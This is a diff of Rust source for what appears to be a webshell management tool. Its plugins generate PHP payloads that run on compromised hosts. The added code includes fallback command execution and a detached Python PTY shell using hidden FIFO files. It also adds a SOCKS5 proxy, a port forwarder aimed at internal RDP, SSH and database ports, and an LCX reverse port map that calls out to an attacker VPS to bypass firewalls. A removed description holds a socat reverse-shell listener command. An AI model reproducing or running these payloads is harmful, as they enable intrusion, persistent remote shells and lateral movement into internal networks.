@@ -44,7 +44,10 @@ fn validate_host_arg(host: &str) -> Result<(), String> {
     if host.is_empty() || host.len() > 255 {
         return Err("host 参数无效".to_string());
     }
-    if !host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':') {
+    if !host
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
+    {
         return Err("host 含非法字符".to_string());
     }
     Ok(())
@@ -74,10 +77,7 @@ fn validate_path_arg(path: &str) -> Result<(), String> {
     if path.is_empty() || path.len() > 4096 {
         return Err("路径参数无效".to_string());
     }
-    if path
-        .chars()
-        .any(|c| ";&|`$'\"()<>\n\r ".contains(c))
-    {
+    if path.chars().any(|c| ";&|`$'\"()<>\n\r ".contains(c)) {
         return Err("路径含非法字符".to_string());
     }
     Ok(())
@@ -148,23 +148,25 @@ impl FeaturePlugin for ProcessesPlugin {
             "php" => {
                 let code = r#"<?php
 error_reporting(0);
-$raw = @shell_exec('ps -eo pid,user,pcpu,pmem,rss,cmd --no-headers 2>/dev/null | head -80');
-$rows = array();
-foreach (explode("
-", trim((string)$raw)) as $line) {
-    $line = trim($line);
-    if ($line === '') continue;
-    $parts = preg_split('/\s+/', $line, 6);
-    if (count($parts) < 6) continue;
-    $rows[] = $parts;
+function dsw_ps_exec($cmd) {
+    if (function_exists('shell_exec')) { $o = @shell_exec($cmd); if ($o !== null) return $o; }
+    if (function_exists('exec')) { $out = array(); @exec($cmd, $out); return implode("\n", $out); }
+    if (function_exists('system')) { ob_start(); @system($cmd); return ob_get_clean(); }
+    if (function_exists('passthru')) { ob_start(); @passthru($cmd); return ob_get_clean(); }
+    if (function_exists('proc_open')) { $p = @proc_open($cmd, array(1=>array('pipe','w'),2=>array('pipe','w')), $pipes); if (is_resource($p)) { $o = stream_get_contents($pipes[1]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $o; } }
+    if (function_exists('popen')) { $fp = @popen($cmd, 'r'); if ($fp) { $o = stream_get_contents($fp); @pclose($fp); return $o; } }
+    return '';
 }
-echo json_encode(array('ok' => true, 'data' => array(
-    'columns' => array('PID', 'USER', '%CPU', '%MEM', 'RSS(KB)', 'COMMAND'),
-    'rows' => $rows,
-)));
+$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+if ($isWin) {
+    $out = dsw_ps_exec('tasklist /V 2>nul || tasklist 2>nul');
+} else {
+    $out = dsw_ps_exec('ps aux 2>/dev/null || ps -ef 2>/dev/null || ps -eo pid,user,pcpu,pmem,args --sort=-pcpu 2>/dev/null');
+}
+echo json_encode(array('ok' => true, 'data' => array('stdout' => trim((string)$out))));
 "#;
-                run_payload(protocol, session, &code, settings)
-                }
+                run_payload(protocol, session, code, settings)
+            }
             other => run_command(protocol, session, process_command(other), settings),
         }
     }
@@ -187,7 +189,7 @@ foreach ($ports as $p) {{
 }}
 echo json_encode(array('host' => $host, 'open' => $open, 'scanned' => count($ports)));
 "#,
-        host_php = php_json_str(&host),
+        host_php = php_json_str(host),
         ports_php = ports_php.join(","),
         timeout = timeout,
     )
@@ -256,7 +258,6 @@ impl FeaturePlugin for PortScanPlugin {
         match language {
             "php" => {
                 let code = php_port_scan_code(&host, &ports, timeout);
-                let output = protocol.run_code(session, "php", &code, settings)?;
                 run_payload(protocol, session, &code, settings)
             }
             // 非 PHP：命令型 /dev/tcp 扫描（Linux 环境）
@@ -337,7 +338,7 @@ impl FeaturePlugin for PhpEnvPlugin {
                 "PHP 环境检测仅支持 php 运行时（当前 {runtime}）"
             )));
         }
-        run_payload(protocol, session, &php_env_code(), settings)
+        run_payload(protocol, session, php_env_code(), settings)
     }
 }
 
@@ -368,8 +369,8 @@ if (is_dir($src)) {{
 $zip->close();
 echo json_encode(array('ok' => true, 'target' => $dst, 'entries' => $count));
 "#,
-        source = php_json_str(&source),
-        target = php_json_str(&target),
+        source = php_json_str(source),
+        target = php_json_str(target),
     )
 }
 
@@ -462,8 +463,8 @@ if ($data === false || $data === '') {{ echo json_encode(array('ok' => false, 'e
 $ok = @file_put_contents($target, $data);
 echo json_encode(array('ok' => (bool)$ok, 'target' => $target, 'size' => strlen($data)));
 "#,
-        url = php_json_str(&url),
-        target = php_json_str(&target),
+        url = php_json_str(url),
+        target = php_json_str(target),
     )
 }
 
@@ -593,7 +594,7 @@ foreach ($it as $f) {{
 }}
 echo json_encode($out);
 "#,
-        dir = php_json_str(&dir),
+        dir = php_json_str(dir),
         depth = max_depth,
     )
 }
@@ -664,36 +665,43 @@ impl FeaturePlugin for SuperTerminalPlugin {
     fn manifest(&self) -> FeatureManifest {
         FeatureManifest {
             id: "super_terminal".into(),
-            name: "交互式终端（linpty）".into(),
+            name: "正向交互式终端（Godzilla SuperTerminal）".into(),
             version: "2.0.0".into(),
-            description: "反弹带 PTY 的完全交互式 shell（script 分配伪终端，"
-                .to_string()
-                .trim_end_matches("。")
-                .to_string()
-                + "支持 su 用户切换 / vim / top）；本地请用 PTY 方式接收："
-                + "socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:'bash',pty,stderr,setsid,sigint,sane",
+            description: "通过 WebShell HTTP 通道实现的正向伪终端交互会话（无须向攻击机反弹端口，穿透 NAT 与防火墙，支持实时读写与交互）。".into(),
             category: "general".into(),
             languages: vec![],
             params: vec![
                 ParamSpec {
-                    name: "host".into(),
-                    label: "攻击机地址".into(),
+                    name: "action".into(),
+                    label: "操作指令 (start/read/write/stop)".into(),
                     param_type: "string".into(),
-                    default: Some(serde_json::json!("127.0.0.1")),
+                    default: Some(serde_json::json!("start")),
+                    options: Some(vec![
+                        "start".into(),
+                        "read".into(),
+                        "write".into(),
+                        "stop".into(),
+                    ]),
+                },
+                ParamSpec {
+                    name: "term_id".into(),
+                    label: "终端会话 ID".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("default")),
                     options: None,
                 },
                 ParamSpec {
-                    name: "port".into(),
-                    label: "攻击机监听端口".into(),
+                    name: "data_b64".into(),
+                    label: "写入输入字节 (Base64)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "offset".into(),
+                    label: "读取文件偏移量".into(),
                     param_type: "int".into(),
-                    default: Some(serde_json::json!(4444)),
-                    options: None,
-                },
-                ParamSpec {
-                    name: "background".into(),
-                    label: "后台驻留".into(),
-                    param_type: "bool".into(),
-                    default: Some(serde_json::json!(true)),
+                    default: Some(serde_json::json!(0)),
                     options: None,
                 },
             ],
@@ -711,15 +719,152 @@ impl FeaturePlugin for SuperTerminalPlugin {
     ) -> Result<serde_json::Value, ProtocolError> {
         match runtime {
             "php" => {
-                let host = param_str(params, "host", "127.0.0.1");
-                let port = param_int(params, "port", 4444).clamp(1, 65535);
-                // 交互式 PTY 反弹（linpty）：script 分配 PTY → su 可用
-                let background = param_bool(params, "background", true);
-                let code = php_reverse_shell_code(&host, port, "/bin/bash", true, background);
+                let action = param_str(params, "action", "start");
+                let term_id = param_str(params, "term_id", "default");
+                let data_b64 = param_str(params, "data_b64", "");
+                let offset = param_int(params, "offset", 0);
+                let code = format!(
+                    r#"<?php
+error_reporting(0);
+@set_time_limit(0);
+$action = '{action}';
+$termId = '{term_id}';
+$tmpDir = sys_get_temp_dir();
+$inPipe = $tmpDir . '/.dsw_in_' . $termId;
+$outPipe = $tmpDir . '/.dsw_out_' . $termId;
+$pidFile = $tmpDir . '/.dsw_pid_' . $termId;
+
+function dsw_run($cmd) {{
+    if (function_exists('shell_exec')) {{
+        $r = @shell_exec($cmd);
+        if ($r !== null) return $r;
+    }}
+    if (function_exists('exec')) {{
+        $out = array();
+        @exec($cmd, $out);
+        return implode("\n", $out);
+    }}
+    if (function_exists('system')) {{
+        ob_start();
+        @system($cmd);
+        return ob_get_clean();
+    }}
+    if (function_exists('passthru')) {{
+        ob_start();
+        @passthru($cmd);
+        return ob_get_clean();
+    }}
+    if (function_exists('proc_open')) {{
+        $p = @proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $pipes);
+        if (is_resource($p)) {{
+            $o = stream_get_contents($pipes[1]);
+            @fclose($pipes[1]);
+            @fclose($pipes[2]);
+            @proc_close($p);
+            return $o;
+        }}
+    }}
+    if (function_exists('popen')) {{
+        $fp = @popen($cmd, 'r');
+        if ($fp) {{
+            $o = stream_get_contents($fp);
+            @pclose($fp);
+            return $o;
+        }}
+    }}
+    return '';
+}}
+
+if ($action === 'start') {{
+    @unlink($inPipe);
+    @unlink($outPipe);
+    @unlink($pidFile);
+    if (function_exists('posix_mkfifo')) {{
+        @posix_mkfifo($inPipe, 0600);
+    }} else {{
+        dsw_run("mkfifo '{{$inPipe}}' 2>/dev/null");
+    }}
+    @touch($outPipe);
+    $pyCode = "import pty,os,select;in_f=os.open(\"{{$inPipe}}\",os.O_RDONLY);out_f=os.open(\"{{$outPipe}}\",os.O_WRONLY);pid,m=pty.fork();\nif pid==0:\n os.environ[\"TERM\"]=\"xterm-256color\"\n sh=\"/bin/bash\" if os.path.exists(\"/bin/bash\") else \"/bin/sh\"\n os.execlp(sh,sh,\"-i\")\nelse:\n while True:\n  r,_,_=select.select([in_f,m],[],[])\n  if in_f in r:\n   d=os.read(in_f,1024)\n   if d: os.write(m,d)\n  if m in r:\n   d=os.read(m,1024)\n   if d: os.write(out_f,d)";
+    $pyCmd = "nohup python3 -c " . escapeshellarg($pyCode) . " >/dev/null 2>&1 & echo $!";
+    $pid = (int)trim((string)dsw_run($pyCmd));
+    if ($pid <= 0) {{
+        $pyCmd2 = "nohup python -c " . escapeshellarg($pyCode) . " >/dev/null 2>&1 & echo $!";
+        $pid = (int)trim((string)dsw_run($pyCmd2));
+    }}
+    if ($pid <= 0) {{
+        $sh = file_exists('/bin/bash') ? '/bin/bash' : (file_exists('/bin/sh') ? '/bin/sh' : 'sh');
+        $cmd = "nohup sh -c \"tail -f /dev/null > '{{$inPipe}}' & ( {{$sh}} -i < '{{$inPipe}}' > '{{$outPipe}}' 2>&1 )\" >/dev/null 2>&1 & echo $!";
+        $pid = (int)trim((string)dsw_run($cmd));
+    }}
+    if ($pid > 0) {{
+        @file_put_contents($pidFile, $pid);
+    }}
+    echo json_encode(array('ok' => true, 'termId' => $termId, 'pid' => $pid, 'action' => 'start'));
+    return;
+}}
+
+if ($action === 'write') {{
+    $data = base64_decode('{data_b64}');
+    if (file_exists($inPipe)) {{
+        $fp = @fopen($inPipe, 'w');
+        if ($fp) {{
+            @fwrite($fp, $data);
+            @fflush($fp);
+            @fclose($fp);
+        }}
+    }}
+    echo json_encode(array('ok' => true, 'action' => 'write'));
+    return;
+}}
+
+if ($action === 'read') {{
+    $offset = (int)'{offset}';
+    $content = '';
+    if (file_exists($outPipe)) {{
+        clearstatcache(true, $outPipe);
+        $size = @filesize($outPipe);
+        if ($size > $offset) {{
+            $fp = @fopen($outPipe, 'rb');
+            if ($fp) {{
+                @fseek($fp, $offset);
+                $content = @fread($fp, min(65536, $size - $offset));
+                $offset = @ftell($fp);
+                @fclose($fp);
+            }}
+        }}
+    }}
+    echo json_encode(array('ok' => true, 'dataB64' => base64_encode($content), 'offset' => $offset, 'action' => 'read'));
+    return;
+}}
+
+if ($action === 'stop') {{
+    if (file_exists($pidFile)) {{
+        $pid = (int)@file_get_contents($pidFile);
+        if ($pid > 0) {{
+            dsw_run("pkill -P {{$pid}} 2>/dev/null; kill -9 {{$pid}} 2>/dev/null");
+            if (function_exists('posix_kill')) {{
+                @posix_kill($pid, 9);
+            }}
+        }}
+        @unlink($pidFile);
+    }}
+    @unlink($inPipe);
+    @unlink($outPipe);
+    echo json_encode(array('ok' => true, 'action' => 'stop'));
+    return;
+}}
+echo json_encode(array('ok' => false, 'error' => '未知操作'));
+"#,
+                    action = action.replace("'", "\\'"),
+                    term_id = term_id.replace("'", "\\'"),
+                    data_b64 = data_b64.replace("'", "\\'"),
+                    offset = offset
+                );
                 run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
-                "交互式终端暂不支持运行时 {other}"
+                "正向交互式终端暂不支持运行时 {other}"
             ))),
         }
     }
@@ -913,24 +1058,49 @@ if (!is_resource($process)) {{
 if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground',
     'connect' => $host . ':' . $port, 'shell' => '{cmd}'));
 "#,
-        host = php_json_str(&host),
+        host = php_json_str(host),
         port = port,
         cmd = pty_shell.replace("\\", "\\\\").replace("'", "\\'"),
         background = if background { "true" } else { "false" },
     )
 }
 
+// ===========================================================================
+// 网络代理模块（分为：1. SOCKS5 代理 / 2. 正向端口转发 / 3. 反向端口映射 LCX / 4. HTTP 代理）
+// ===========================================================================
+
 // ---------------------------------------------------------------------------
-// SOCKS5 代理（通用，PHP 载荷：pcntl 后台 / 前台窗口）
+// 1. SOCKS5 代理（通用，PHP 载荷：RFC 1928 / RFC 1929 认证，非阻塞多路复用）
 // ---------------------------------------------------------------------------
 
-fn php_socks_proxy_code(port: u32, window_secs: u32, action: &str) -> String {
+/// 生成 SOCKS5 代理的 PHP 执行载荷。
+///
+/// 【工作原理与技术细节】：
+/// 1. **进程守护与脱离**：
+///    - 若目标系统支持 `pcntl_fork`，子进程调用 `posix_setsid()` 脱离当前 Web 会话与终端控制组，
+///      将 PID 写入临时文件，父进程立即返回 JSON 响应（避免 HTTP 请求长时间挂起超时）；
+/// 2. **SOCKS5 握手协商 (RFC 1928)**：
+///    - 服务端绑定并监听指定端口 (`stream_socket_server`)；
+///    - 接收客户端协商报文，判断是否启用账号密码认证（Method 0x02）；
+/// 3. **RFC 1929 用户名密码子协商**：
+///    - 当 `$authRequired` 为 true 时，校验客户端发送的 ULEN/UNAME 与 PLEN/PASSWD；
+///    - 校验通过回复 `\x01\x00`，失败回复 `\x01\x01` 并立即断开非法接入；
+/// 4. **CONNECT 命令解析与非阻塞转发**：
+///    - 解析 IPv4 (0x01) 或动态内网域名 (0x03) 目标与端口；
+///    - 调用 `stream_socket_client` 连接内网目标，使用 `stream_select` 进行全双工异步非阻塞数据流转发。
+fn php_socks_proxy_code(
+    port: u32,
+    window_secs: u32,
+    action: &str,
+    username: &str,
+    password: &str,
+) -> String {
     if action == "stop" {
         return format!(
             r#"<?php
 error_reporting(0);
 $port = {port};
-$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
+$pidFile = sys_get_temp_dir() . '/.dsw_socks_' . $port . '.pid';
 $stopped = false;
 $pid = 0;
 if (is_file($pidFile)) {{
@@ -938,42 +1108,76 @@ if (is_file($pidFile)) {{
     if ($pid > 1 && function_exists('posix_kill')) {{ @posix_kill($pid, 9); $stopped = true; }}
     @unlink($pidFile);
 }}
-echo json_encode(array('ok' => true, 'stopped' => $stopped, 'pid' => $pid));
+echo json_encode(array('ok' => true, 'stopped' => $stopped, 'pid' => $pid, 'service' => 'socks_proxy'));
 return;
 "#,
             port = port,
         );
     }
+    let safe_user = username.replace('\\', "\\\\").replace('\'', "\\'");
+    let safe_pass = password.replace('\\', "\\\\").replace('\'', "\\'");
+
     format!(
         r#"<?php
 set_time_limit(0);
 error_reporting(0);
 $port = {port};
 $window = {window};
-$pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
+$authUser = '{safe_user}';
+$authPass = '{safe_pass}';
+$authRequired = ($authUser !== '' || $authPass !== '');
+$pidFile = sys_get_temp_dir() . '/.dsw_socks_' . $port . '.pid';
 $pid = 0;
 if (function_exists('pcntl_fork')) {{
     $pid = pcntl_fork();
     if ($pid > 0) {{
-        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port));
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port, 'auth' => $authRequired, 'service' => 'socks_proxy'));
         return;
     }}
     if (function_exists('posix_setsid')) @posix_setsid();
     @file_put_contents($pidFile, getmypid());
 }}
+
 $srv = @stream_socket_server('tcp://0.0.0.0:' . $port, $errno, $errstr, STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
 if (!$srv) {{ echo json_encode(array('ok' => false, 'error' => $errstr)); return; }}
 $deadline = time() + $window;
+
 while (time() < $deadline) {{
     $conn = @stream_socket_accept($srv, 3);
     if (!$conn) continue;
-    $head = fread($conn, 2);
-    if (strlen($head) < 2 || ord($head[0]) !== 5) {{ fclose($conn); continue; }}
+    $head = @fread($conn, 2);
+    if (strlen($head) < 2 || ord($head[0]) !== 5) {{ @fclose($conn); continue; }}
     $nm = ord($head[1]);
-    if ($nm > 0) @fread($conn, $nm);
-    @fwrite($conn, chr(5) . chr(0));
+    $methods = '';
+    if ($nm > 0) $methods = (string)@fread($conn, $nm);
+    if ($authRequired) {{
+        if (strpos($methods, "\x02") === false) {{
+            @fwrite($conn, "\x05\xFF");
+            @fclose($conn);
+            continue;
+        }}
+        @fwrite($conn, "\x05\x02");
+        $authVer = @fread($conn, 1);
+        if ($authVer !== "\x01") {{ @fclose($conn); continue; }}
+        $uLenByte = @fread($conn, 1);
+        if (strlen($uLenByte) < 1) {{ @fclose($conn); continue; }}
+        $uLen = ord($uLenByte);
+        $user = $uLen > 0 ? (string)@fread($conn, $uLen) : '';
+        $pLenByte = @fread($conn, 1);
+        if (strlen($pLenByte) < 1) {{ @fclose($conn); continue; }}
+        $pLen = ord($pLenByte);
+        $pass = $pLen > 0 ? (string)@fread($conn, $pLen) : '';
+        if ($user !== $authUser || $pass !== $authPass) {{
+            @fwrite($conn, "\x01\x01");
+            @fclose($conn);
+            continue;
+        }}
+        @fwrite($conn, "\x01\x00");
+    }} else {{
+        @fwrite($conn, "\x05\x00");
+    }}
     $req = @fread($conn, 4);
-    if (strlen($req) < 4 || ord($req[0]) !== 5 || ord($req[1]) !== 1) {{ fclose($conn); continue; }}
+    if (strlen($req) < 4 || ord($req[0]) !== 5 || ord($req[1]) !== 1) {{ @fclose($conn); continue; }}
     $atype = ord($req[3]);
     if ($atype === 1) {{
         $ip = @inet_ntop(@fread($conn, 4)); $pb = @unpack('n', @fread($conn, 2));
@@ -981,9 +1185,9 @@ while (time() < $deadline) {{
     }} elseif ($atype === 3) {{
         $len = ord(@fread($conn, 1)); $host = @fread($conn, $len); $pb = @unpack('n', @fread($conn, 2));
         $rport = $pb[1];
-    }} else {{ fclose($conn); continue; }}
+    }} else {{ @fclose($conn); continue; }}
     $remote = @stream_socket_client('tcp://' . $host . ':' . $rport, $e1, $e2, 8);
-    if (!$remote) {{ @fwrite($conn, chr(5) . chr(5) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0)); fclose($conn); continue; }}
+    if (!$remote) {{ @fwrite($conn, chr(5) . chr(5) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0)); @fclose($conn); continue; }}
     @fwrite($conn, chr(5) . chr(0) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0));
     @stream_set_blocking($conn, false);
     @stream_set_blocking($remote, false);
@@ -1004,14 +1208,16 @@ while (time() < $deadline) {{
     @fclose($conn);
     @fclose($remote);
 }}
-if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window));
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window, 'auth' => $authRequired, 'service' => 'socks_proxy'));
 "#,
         port = port,
         window = window_secs,
+        safe_user = safe_user,
+        safe_pass = safe_pass,
     )
 }
 
-/// SOCKS5 代理（通用：PHP 载荷，pcntl 可用时后台驻留）。
+/// SOCKS5 代理插件：在目标靶机启动 SOCKS5 代理（支持 RFC 1929 认证，支持 pcntl 后台常驻）。
 pub struct SocksProxyPlugin;
 
 impl FeaturePlugin for SocksProxyPlugin {
@@ -1019,8 +1225,8 @@ impl FeaturePlugin for SocksProxyPlugin {
         FeatureManifest {
             id: "socks_proxy".into(),
             name: "Socks 代理".into(),
-            version: "1.0.0".into(),
-            description: "在目标主机启动 SOCKS5 代理（无认证；pcntl 可用时后台驻留）。".into(),
+            version: "2.0.0".into(),
+            description: "在目标主机启动 SOCKS5 代理服务（支持 RFC 1929 用户名/密码认证，支持 pcntl 后台常驻与动态内网路由）。".into(),
             category: "general".into(),
             languages: vec![],
             params: vec![
@@ -1029,6 +1235,20 @@ impl FeaturePlugin for SocksProxyPlugin {
                     label: "监听端口".into(),
                     param_type: "int".into(),
                     default: Some(serde_json::json!(1080)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "username".into(),
+                    label: "认证用户名 (留空免认证)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "password".into(),
+                    label: "认证密码 (留空免认证)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
                     options: None,
                 },
                 ParamSpec {
@@ -1063,7 +1283,9 @@ impl FeaturePlugin for SocksProxyPlugin {
                 let port = param_int(params, "port", 1080).clamp(1024, 65535);
                 let window = param_int(params, "window", 600).clamp(30, 3600);
                 let action = param_str(params, "action", "start");
-                let code = php_socks_proxy_code(port, window, &action);
+                let username = param_str(params, "username", "");
+                let password = param_str(params, "password", "");
+                let code = php_socks_proxy_code(port, window, &action, &username, &password);
                 run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
@@ -1074,10 +1296,504 @@ impl FeaturePlugin for SocksProxyPlugin {
 }
 
 // ---------------------------------------------------------------------------
+// 2. 正向端口转发（通用，PHP 载荷：监听本地端口 -> 转发至指定内网主机端口）
+// ---------------------------------------------------------------------------
+
+/// 生成正向端口转发的 PHP 执行载荷。
+///
+/// 【工作原理与适用场景】：
+/// - **适用场景**：靶机处于内网边界（双网卡），外部攻击机可访问靶机指定端口，但无法直接触达隔离内网服务（如 192.168.1.50:3389 RDP、内网数据库等）；
+/// - **实现机制**：
+///   1. 靶机在自身绑定并监听 `$listenPort`；
+///   2. 外部客户端向靶机 `$listenPort` 建立 TCP 连接；
+///   3. 靶机主动发起对 `$targetHost:$targetPort` 的 TCP 三次握手；
+///   4. 握手成功后转入非阻塞 `stream_select` 轮询管道，将客户端与内网服务数据进行透明双向透传。
+fn php_port_forward_code(
+    port: u32,
+    target_host: &str,
+    target_port: u32,
+    window_secs: u32,
+    action: &str,
+) -> String {
+    if action == "stop" {
+        return format!(
+            r#"<?php
+error_reporting(0);
+$port = {port};
+$pidFile = sys_get_temp_dir() . '/.dsw_fwd_' . $port . '.pid';
+$stopped = false;
+$pid = 0;
+if (is_file($pidFile)) {{
+    $pid = (int)@file_get_contents($pidFile);
+    if ($pid > 1 && function_exists('posix_kill')) {{ @posix_kill($pid, 9); $stopped = true; }}
+    @unlink($pidFile);
+}}
+echo json_encode(array('ok' => true, 'stopped' => $stopped, 'pid' => $pid, 'service' => 'port_forward'));
+return;
+"#,
+            port = port,
+        );
+    }
+    let safe_thost = target_host.replace('\\', "\\\\").replace('\'', "\\'");
+
+    format!(
+        r#"<?php
+set_time_limit(0);
+error_reporting(0);
+$port = {port};
+$targetHost = '{safe_thost}';
+$targetPort = {target_port};
+$window = {window};
+$pidFile = sys_get_temp_dir() . '/.dsw_fwd_' . $port . '.pid';
+$pid = 0;
+if (function_exists('pcntl_fork')) {{
+    $pid = pcntl_fork();
+    if ($pid > 0) {{
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port, 'target' => $targetHost . ':' . $targetPort, 'service' => 'port_forward'));
+        return;
+    }}
+    if (function_exists('posix_setsid')) @posix_setsid();
+    @file_put_contents($pidFile, getmypid());
+}}
+
+$srv = @stream_socket_server('tcp://0.0.0.0:' . $port, $errno, $errstr, STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
+if (!$srv) {{ echo json_encode(array('ok' => false, 'error' => $errstr)); return; }}
+$deadline = time() + $window;
+
+while (time() < $deadline) {{
+    $conn = @stream_socket_accept($srv, 3);
+    if (!$conn) continue;
+    $remote = @stream_socket_client('tcp://' . $targetHost . ':' . $targetPort, $e1, $e2, 8);
+    if (!$remote) {{ @fclose($conn); continue; }}
+    @stream_set_blocking($conn, false);
+    @stream_set_blocking($remote, false);
+    $start = time();
+    while (time() - $start < 240) {{
+        $r = array($conn, $remote); $w = null; $x = null;
+        $n = @stream_select($r, $w, $x, 1);
+        if ($n === false) break;
+        foreach ($r as $sock) {{
+            $data = @fread($sock, 8192);
+            if ($data === '' && @feof($sock)) break 2;
+            if ($data !== '' && $data !== false) {{
+                $dest = ($sock === $conn) ? $remote : $conn;
+                @fwrite($dest, $data);
+            }}
+        }}
+    }}
+    @fclose($conn);
+    @fclose($remote);
+}}
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window, 'service' => 'port_forward'));
+"#,
+        port = port,
+        safe_thost = safe_thost,
+        target_port = target_port,
+        window = window_secs,
+    )
+}
+
+/// 正向端口转发插件：在目标主机监听端口并透明转发至指定的内网 IP:端口。
+pub struct PortForwardPlugin;
+
+impl FeaturePlugin for PortForwardPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "port_forward".into(),
+            name: "端口转发".into(),
+            version: "2.0.0".into(),
+            description: "在目标主机监听指定入站端口，将接收到的所有 TCP 流量实时透明转发至指定的内网主机与端口（如内网 3389/22/3306）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "port".into(),
+                    label: "本地监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(8888)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target_host".into(),
+                    label: "目标内网主机 IP".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("127.0.0.1")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target_port".into(),
+                    label: "目标内网端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(3389)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "window".into(),
+                    label: "存活窗口（秒）".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(600)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "action".into(),
+                    label: "操作".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("start")),
+                    options: Some(vec!["start".to_string(), "stop".to_string()]),
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let port = param_int(params, "port", 8888).clamp(1024, 65535);
+                let target_host = param_str(params, "target_host", "127.0.0.1");
+                let target_port = param_int(params, "target_port", 3389).clamp(1, 65535);
+                let window = param_int(params, "window", 600).clamp(30, 3600);
+                let action = param_str(params, "action", "start");
+                let code = php_port_forward_code(port, &target_host, target_port, window, &action);
+                run_payload(protocol, session, &code, settings)
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "端口转发暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 3. 反向端口映射 LCX（通用，PHP 载荷：主动出站连接 VPS + 连接内网目标并桥接）
+// ---------------------------------------------------------------------------
+
+/// 生成反向端口映射（LCX 模式）的 PHP 执行载荷。
+///
+/// 【工作原理与适用场景】：
+/// - **适用场景**：靶机处于严苛防火墙策略下（**严禁任何入站连接，仅允许向公网指定端口出站**）；
+/// - **实现机制 (经典 LCX Slave 模式)**：
+///   1. 靶机不在本地开启任何监听端口，而是主动向攻击机的公网 VPS 发起出站 TCP 连接；
+///   2. 同时靶机连接本地或内网目标服务（如 `127.0.0.1:3389` 或 `192.168.1.10:22`）；
+///   3. 将公网外连套接字与内网服务套接字在靶机内存中通过 `stream_select` 进行桥接传输，成功突破单向防火墙封锁。
+fn php_port_map_code(
+    remote_host: &str,
+    remote_port: u32,
+    target_host: &str,
+    target_port: u32,
+    window_secs: u32,
+    action: &str,
+) -> String {
+    if action == "stop" {
+        return format!(
+            r#"<?php
+error_reporting(0);
+$remotePort = {remote_port};
+$pidFile = sys_get_temp_dir() . '/.dsw_map_' . $remotePort . '.pid';
+$stopped = false;
+$pid = 0;
+if (is_file($pidFile)) {{
+    $pid = (int)@file_get_contents($pidFile);
+    if ($pid > 1 && function_exists('posix_kill')) {{ @posix_kill($pid, 9); $stopped = true; }}
+    @unlink($pidFile);
+}}
+echo json_encode(array('ok' => true, 'stopped' => $stopped, 'pid' => $pid, 'service' => 'port_map'));
+return;
+"#,
+            remote_port = remote_port,
+        );
+    }
+    let safe_thost = target_host.replace('\\', "\\\\").replace('\'', "\\'");
+    let safe_rhost = remote_host.replace('\\', "\\\\").replace('\'', "\\'");
+
+    format!(
+        r#"<?php
+set_time_limit(0);
+error_reporting(0);
+$targetHost = '{safe_thost}';
+$targetPort = {target_port};
+$remoteHost = '{safe_rhost}';
+$remotePort = {remote_port};
+$window = {window};
+$pidFile = sys_get_temp_dir() . '/.dsw_map_' . $remotePort . '.pid';
+$pid = 0;
+if (function_exists('pcntl_fork')) {{
+    $pid = pcntl_fork();
+    if ($pid > 0) {{
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'remote' => $remoteHost . ':' . $remotePort, 'target' => $targetHost . ':' . $targetPort, 'service' => 'port_map'));
+        return;
+    }}
+    if (function_exists('posix_setsid')) @posix_setsid();
+    @file_put_contents($pidFile, getmypid());
+}}
+
+if ($remoteHost === '' || $remotePort === 0) {{
+    echo json_encode(array('ok' => false, 'error' => '需指定远程 VPS 主机地址与端口'));
+    return;
+}}
+
